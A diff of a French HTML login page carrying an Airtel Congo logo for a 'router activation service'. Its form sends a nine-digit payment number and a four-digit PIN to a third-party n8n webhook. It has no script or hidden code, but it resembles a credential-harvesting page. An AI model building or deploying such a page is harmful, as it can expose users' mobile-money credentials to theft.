@@ -2,101 +2,77 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Authentification</title>
+  <title>Formulaire d'Authentification</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
       margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
       background-color: #f2f2f2;
-    }
-
-    header {
       display: flex;
+      justify-content: center;
       align-items: center;
-      padding: 10px;
-      background-color: #FF0000;
-      color: white;
+      height: 100vh;
     }
 
-    header img {
-      height: 150px;
-      margin-right: 100px;
+    .card {
+      background-color: white;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 300px;
     }
 
-    main {
-      padding: 30px;
-      text-align: center;
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    label {
+      margin-bottom: 5px;
+      font-weight: bold;
     }
 
     input {
       padding: 10px;
-      margin: 10px;
-      width: 300px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
     }
 
     button {
-      padding: 10px 20px;
+      padding: 12px;
+      font-size: 16px;
       background-color: #007bff;
       color: white;
       border: none;
+      border-radius: 6px;
       cursor: pointer;
     }
 
-    footer {
-      margin-top: 50px;
-      background-color: #eee;
-      padding: 10px;
-      text-align: center;
-    }
-
-    #response {
-      margin-top: 20px;
-      color: green;
-      font-weight: bold;
-      white-space: pre-wrap;
-    }
-
-    .offre {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      flex-wrap: wrap;
-      margin-top: 30px;
-    }
-
-    .offre-item {
-      background-color: white;
-      border: 1px solid #ccc;
-      padding: 20px;
-      width: 250px;
-      border-radius: 10px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-    }
-
-    .offre-item button {
-      margin-top: 10px;
-      width: 100%;
+    button:hover {
+      background-color: #0056b3;
     }
   </style>
 </head>
 <body>
 
-<header>
-  <img src="https://raw.githubusercontent.com/christale-kib/routeur-paiement/main/Airtel_Congo.jpg" alt="Logo">
-  <h1>Service d'activation de routeur</h1>
-</header>
-
-<main>
-  <h2>Authentification</h2>
+  <header>
+    <img src="https://raw.githubusercontent.com/christale-kib/routeur-paiement/main/Airtel_Congo.jpg" alt="Logo">
+    <h1>Service d'activation de routeur</h1>
+  </header>
 
   <div class="card">
+    <h2>Authentification</h2>
     <form action="https://n8n.srv878521.hstgr.cloud/webhook/Authentification?id=${id}&numero_routeur=${numero_routeur}" method="POST">
-      <div class="card">
+      
+      <div>
         <label for="numero">Numéro</label>
-        <input type="text" id="numero" name="numero_paiement" pattern="\\d{9}"inputmode="numeric" maxlength="9" required>
+        <input type="text" id="numero" name="numero_paiement" pattern="\\d{9}" inputmode="numeric" maxlength="9" required>
       </div>
 
-      <div class="card">
+      <div>
         <label for="password">Mot de passe</label>
         <input type="password" id="password" name="password" pattern="\\d{4}" inputmode="numeric" maxlength="4" required>
       </div>
@@ -105,11 +81,19 @@
     </form>
   </div>
 
-</main>
-
 <footer>
   <p>&copy; 2025 - Service d'activation de Routeur. Tous droits réservés.</p>
 </footer>
 
 </body>
 </html>
+
+
+
+
+
+
+
+
+
+
